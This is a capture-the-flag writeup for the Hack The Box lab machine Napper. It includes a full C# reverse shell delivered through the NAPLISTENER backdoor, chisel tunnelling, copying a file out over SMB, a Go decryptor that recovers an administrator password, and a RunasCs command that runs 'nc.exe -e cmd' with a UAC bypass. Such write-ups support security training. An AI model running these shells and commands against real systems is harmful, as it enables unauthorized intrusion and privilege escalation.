---
layout: writeup
category: HTB
description: In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor (NAPLISTENER) present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt.
points: 40
solves: 1071
tags: information_disclosure abusing_backdoor naplistener elasticsearch reverse_engineering go_reverse_engineering decryption_with_AES runascs 
date: 2024-05-03
comments: false
title: HTB Napper Writeup
---

In this machine, we have a information disclosure in a posts page. Next, we have to exploit a backdoor present in the machine to gain access as Ruben. Then, we have to forward the port of elastic search to our machine, in which we can see a blob and seed for the backup user. Also, we have to reverse engineer a go compiled binary with Ghidra newest version to see how is used this information from elasticsearch db to retrieve the password of user backup. Finally, with RunasCs we can execute a command as backup, who belongs to the Administrators group and we can see root.txt.

# Enumeration

## Port scanning

I will start with a basic nmap scanning to see which ports are available:

```bash
❯ sudo nmap -p- -sVC -sS --min-rate 5000 -n -Pn 10.10.11.240 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-03 12:48 CEST
Nmap scan report for 10.10.11.240
Host is up (0.052s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://app.napper.htb
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-generator: Hugo 0.112.3
|_ssl-date: 2024-05-03T10:48:50+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.79 seconds
```

We have port 80, which redirects to https://app.napper.htb, so the only important port is 443.

Let's add the hosts napper.htb and app.napper.htb to /etc/hosts

```bash
❯ echo '10.10.11.240 napper.htb app.napper.htb' | sudo tee -a /etc/hosts 
```

## Web enumeration

Since we have domains let's try to enumerate subdomains by our own to see if there is another:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.napper.htb" -u https://napper.htb --hh=5602
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://napper.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000387:   401        29 L     100 W      1293 Ch     "internal"                                                                                                             

Total time: 35.98812
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 138.6290
```

We have the internal.napper.htb subdomain, which asks for credentials for basic authentication:

![Basic auth required](/assets/images/Napper/basic_auth_required.png)

We don't have any valid credentials so we can't access, let's take a look to napper.htb and app.napper.htb

### napper.htb

It's a research blog with a lot of posts:

![napper.htb](/assets/images/Napper/napper.htb.png)

### app.napper.htb

It's the same as napper.htb but with other font:

![app.napper.htb](/assets/images/Napper/app.napper.htb.png)

Looking at the posts, we can see one that talks about basic authentication:

![Post about basic auth](/assets/images/Napper/post_about_basic_auth.png)

And in the bottom, we can see a powershell command to create a user for that basic auth, in which we can see the credentials example:ExamplePassword:

![Command to create username of basic auth](/assets/images/Napper/command_to_create_username_of_basic_auth.png)

### internal.napper.htb

Supposing that the admins executed that command, we can try to access to internal.napper.htb with those credentials:

![Access granted on internal.napper.htb](/assets/images/Napper/internal.napper.htb_access_granted.png)

Now we can see an internal post that talks about a malware research and it is supposed that they are infected with the NAPLISTENER backdoor:

![Internal Post](/assets/images/Napper/internal_post.png)

In the references below we can end up with [this article](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph) that talks about how this backdoor is deployed and how to use it.

To find out if it exists in the machine, we are said that in a normal GET request to /ews/MsExgHealthCheckd/, it has to return a 404 status code but also some special headers:

![404 Special Headers](/assets/images/Napper/404_special_headers.png)

Let's try it in all the domains with curl with the parameter -k for ignoring the warning of self-signed certificates and -v (verbose) to see the headers:

- internal.napper.htb

```bash
❯ curl -s -X GET -k https://example:ExamplePassword@internal.napper.htb/ews/MsExgHealthCheckd/ -v
* Host internal.napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
<-- MORE CONTENT -->
> GET /ews/MsExgHealthCheckd/ HTTP/2
> Host: internal.napper.htb
> Authorization: Basic ZXhhbXBsZTpFeGFtcGxlUGFzc3dvcmQ=
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/2 404 
< content-type: text/html
< server: Microsoft-IIS/10.0
< date: Fri, 03 May 2024 11:28:54 GMT
< content-length: 1245
< 
<-- MORE CONTENT -->
```

Here we don't have it.

- app.napper.htb


```bash
❯ curl -s -X GET -k https://app.napper.htb/ews/MsExgHealthCheckd/ -v
* Host app.napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
* Connected to app.napper.htb (10.10.11.240) port 443
<-- MORE CONTENT -->
> GET /ews/MsExgHealthCheckd/ HTTP/2
> Host: app.napper.htb
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/2 404 
< content-type: text/html
< server: Microsoft-IIS/10.0
< date: Fri, 03 May 2024 11:32:05 GMT
< content-length: 1245
<
<-- MORE CONTENT -->
```

Here we neither have it.

- napper.htb


```bash
❯ curl -s -X GET -k https://napper.htb/ews/MsExgHealthCheckd/ -v
* Host napper.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.240
*   Trying 10.10.11.240:443...
* Connected to napper.htb (10.10.11.240) port 443

<-- MORE CONTENT -->

< HTTP/2 404 
< content-length: 0
< content-type: text/html; charset=utf-8
< server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
< x-powered-by: ASP.NET
< date: Fri, 03 May 2024 11:33:38 GMT
< 
* Connection #0 to host napper.htb left intact

```

Here yes we have those special headers (Content-Type: charset=utf-8 and Server: Microsoft-HTTPAPI/2.0), so it exists.

Also, we are said that any POST request that contains a base64-encoded .NET assembly in the parameter sdafwe3rwe23, it will be executed on memory.

![POST request with special parameter](/assets/images/Napper/post_request_with_special_parameter.png)

So we can try to execute command on the machine with this backdoor.

# Access as ruben

For using this backdoor, we need a C# assembly code and a compiler. In this case I will use the code that generates [revshells.com](https://revshells.com) but we have to modify some things. In first place, we have to change sh to cmd because this is a windows machine, rename the namespace to the same name of the file (in my case Program) and replace the content of the main function to `new Run();` and above create that function with the content that we removed from main function. With these changes, the remaining C# code is this:

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace Program
{
	public class Run
	{
		static StreamWriter streamWriter;

    public Run()
    {
      using(TcpClient client = new TcpClient("10.10.14.76", 443))
      {
        using(Stream stream = client.GetStream())
        {
          using(StreamReader rdr = new StreamReader(stream))
          {
            streamWriter = new StreamWriter(stream);
            
            StringBuilder strInput = new StringBuilder();

            Process p = new Process();
            p.StartInfo.FileName = "cmd";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            while(true)
            {
              strInput.Append(rdr.ReadLine());
              //strInput.Append("\n");
              p.StandardInput.WriteLine(strInput);
              strInput.Remove(0, strInput.Length);
            }
          }
        }
      }
    }
    public static void Main(string[] args)
    {
       new Run();
    }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(outLine.Data))
      {
        try
        {
          strOutput.Append(outLine.Data);
          streamWriter.WriteLine(strOutput);
          streamWriter.Flush();
        }
        catch (Exception err) { }
      }
    }
  }
}
```

Now that we have to code, we need a compiler to compile it, to made it portable, we can use mcs:

```bash
❯ mcs -out:Program.exe Program.cs
Program.cs(64,34): warning CS0168: The variable `err' is declared but never used
Compilation succeeded - 1 warning(s)
```

Now that we have the assembly finalized, we have to set up the nc listener on the port you specified, base64 encode, urlencode the payload and send it to the server:

```bash
❯ base64 -w 0 Program.exe | xclip -sel clip # Base64 the program and copy it to clipboard
❯ payload="your_copied_payload"
❯ php -r "echo urlencode('$payload');" | xclip -sel clip # Url encode the payload and copy it to clipboard
❯ urlencoded_payload="your_new_copied_payload"
❯ curl -X POST -k https://napper.htb/ews/MsExgHealthCheckd/ -d "sdafwe3rwe23=$urlencoded_payload"
```

And we receive the shell as ruben:

![Shell received](/assets/images/Napper/shell_received.png)

This shell is so uncomfortable so I will use the [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script of nishang to have a more comfortable shell. ConPtyShell for some reason doesn't work on this machine, so I have to deal with this script and we can't do ctrl+c. Rlwrap is for doing ctrl+l, have command history and move with the arrows.

![New better shell](/assets/images/Napper/new_better_shell.png)

# Privilege escalation 

Looking at the files, we end up with the folder C:\Temp\www\internal\content\posts\internal-laps-alpha which has two files, one .env with credentials for elastic and a binary a.exe:

```powershell
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> dir


    Directory: C:\Temp\www\internal\content\posts\internal-laps-alpha


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/9/2023  12:28 AM             82 .env                                                                 
-a----          6/9/2023  12:20 AM       12697088 a.exe                                                                


PS C:\Temp\www\internal\content\posts\internal-laps-alpha> 
```

In the .env we have credentials for elastic, which is running on port 9200 as it's visible in the .env file:

```powershell
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here

ELASTICURI=https://127.0.0.1:9200
```

```powershell
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> cmd /c "netstat.exe -ano" | findstr LISTENING
```
![Port 9200 opened](/assets/images/Napper/port_9200_opened.png)

Let's forward that port to our machine using chisel:

### Attacker


```bash
❯ ./chisel server -p 1234 --reverse
2024/05/03 20:52:07 server: Reverse tunnelling enabled
2024/05/03 20:52:07 server: Fingerprint CCdOgnd9DUXQk2yL0WfkRa1ALH1Yygc2itgC3YD5g3k=
2024/05/03 20:52:07 server: Listening on http://0.0.0.0:1234
```

### Victim

It's recommended to open another shell to leave the other active for when we need it.

```powershell
PS C:\Windows\Temp\Privesc>.\chisel.exe client 10.10.14.76:1234 R:9200:127.0.0.1:9200
```

Let's use the credentials in the .env file to inspect elasticsearch service using [this guide](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch):

![Elasticsearch inspecting the main page](/assets/images/Napper/elastic_search_inspecting_main_page.png)

We see a hash (which we could try to crack but don't work) for the backup user that exists in the victim machine and is a Administrator:

```powershell
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> net user backup
User name                    backup
Full Name                    backup
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/3/2024 1:01:56 PM
Password expires             Never
Password changeable          5/3/2024 1:01:56 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/9/2023 5:27:07 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

Also in the endpoint `/_search?pretty=true` we can see a seed and a blob that changes every certain time and we don't know how to use it:

![Blob and seed in elasticsearch](/assets/images/Napper/blob_and_seed_in_elasticsearch.png)

We can try to reverse engineer the binary to see if we see something interesting there.
Let's transfer the binary to our machine using smb:

### Attacker

```bash
❯ smbserver.py -username test -password test123 -smb2support smbDir $(pwd)
Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### Victim

```powershell
PS C:\Temp\www\internal\content\posts\internal-laps-alpha> net use z: \\10.10.14.76\smbDir /user:test test123
The command completed successfully.

PS C:\Temp\www\internal\content\posts\internal-laps-alpha> copy a.exe z:\.

PS C:\Temp\www\internal\content\posts\internal-laps-alpha>
```

Trying to analyze it with ghidra we are said that its language is go when we import the binary:

![We discover it's a go binary](/assets/images/Napper/golang_ghidra.png)

The go language is so hard to decompile because its characteristics like is statically linked, it's size, etc. [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases) is a great reverse engineering tool that deals with all this but it takes a bit long to analyze so we have to wait. Install it from the web page because from apt is outdated and it doesn't has the same decompiling of go that has the newest version.

To analyze the functions, first start with Exports > main.main that is the equivalent to main function in C.

Looking at the code we can see that is using the ELASTICUSER, ELASTICPASS and ELASTICURI variables from .env file:

![Get env variables](/assets/images/Napper/getenv.png)

The most interesting part is here:

![Most interesting part](/assets/images/Napper/most_interesting_part.png)

First, it stores in sVar10 a random string:

![Generates random string](/assets/images/Napper/generates_random_string.png)

Next, uses the seed to create a key, which is 16 characters long:

![Generate key](/assets/images/Napper/generate_key.png)

Then, it creates the blob with the random string and the generated key. It initializes a new AES cipher with the key, creates a CFB mode cipher and encodes it a base64:

![How it encrypts](/assets/images/Napper/how_it_encrypts.png)

Also, it writes the blob in the elasticsearch database:

![Writes blob in elasticsearch db](/assets/images/Napper/writes_blob_elasticsearch_db.png)

Finally, it uses the random string to change the password of the user backup which belong to Admins group:

![Changes password of backup user](/assets/images/Napper/changes_password_of_user_backup.png)

Now we have to do the reverse process with the blob and the seed we have in the elasticsearch database here:

![Seed and blob on elasticsearch db](/assets/images/Napper/elasticsearchdb_seed_and_blob.png)

For that I have created this script with a lot of help of ChatGPT (see the prompts [Prompt 1](https://chat.openai.com/share/578addd0-3ac2-4a1b-8ca0-367c5f877480) and [Prompt 2](https://chat.openai.com/share/6cfc3125-9889-4ad8-bf22-b69a771d1743)) because I don't understand nothing of Go:

```go
package main

import (
    "fmt"
    "math/rand"
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "os"
    "strconv"
)

func genKey(seed int64) []byte {
    // Seed the random number generator
    rand.Seed(seed)

    // Generate a random key of length 16
    key := make([]byte, 16)
    for i := 0; i < 16; i++ {
        key[i] = byte(rand.Intn(254) + 1) // Random number between 1 and 255
    }
    return key
}

func decrypt(key []byte, encodedStr string) (string, error) {
    // Decode the base64 encoded string
    encrypted, err := base64.URLEncoding.DecodeString(encodedStr)
    if err != nil {
        return "", err
    }

    // Initialize AES cipher with the provided key
    block, err := aes.NewCipher(key)
    if err != nil {
        return "", err
    }

    // Create a cipher feedback (CFB) mode cipher
    iv := encrypted[:aes.BlockSize]
    encrypted = encrypted[aes.BlockSize:]

    stream := cipher.NewCFBDecrypter(block, iv)
    decrypted := make([]byte, len(encrypted))
    stream.XORKeyStream(decrypted, encrypted)

    return string(decrypted), nil
}


func main() {
    // Use the current time as seed
    
    if (len(os.Args) < 2) {
      fmt.Println("Usage:", "decrypt.go", "<seed>", "<blob>")
      fmt.Println("Please provide seed and blob")
    
    } else {
      seed, err := strconv.ParseInt(os.Args[1], 10, 64)
      encodedStr := os.Args[2]
      key := genKey(seed)

      decryptedStr, err := decrypt(key, encodedStr)
      if err != nil {
          fmt.Println("Error:", err)
          return
      }

      fmt.Println("Decrypted String (Password):", decryptedStr)
    }  
}

```

Now, spawn a nc listener, Download nc.exe and RunasCs.exe in the victim machine to run as user backup this command to gain access:

```powershell
PS C:\Windows\Temp\Privesc> ./RunasCs.exe backup <decrypted_password> "C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.76 443" -l 8 --bypass-uac
```

And we gain access as backup:

![Access as backup](/assets/images/Napper/access_as_backup.png)

Now we can see root flag:

```cmd
C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
16****************************a7
```

That is the machine, hope you liked it.
